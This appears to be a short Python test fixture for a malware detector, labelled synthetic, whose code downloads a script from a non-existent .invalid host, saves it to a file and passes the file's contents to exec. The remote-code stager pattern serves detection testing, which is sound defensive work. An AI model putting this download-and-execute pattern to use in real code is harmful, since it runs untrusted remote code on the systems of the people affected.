# FIXTURE ONLY - synthetic detection test sample, not real malware
# Shape: the download is saved to a file first, and the file is read back into exec.
# Host is a non-existent .invalid domain.
import urllib.request

urllib.request.urlretrieve("https://dl.example.invalid/stage.py", "stage_cache.py")
exec(open("stage_cache.py").read())
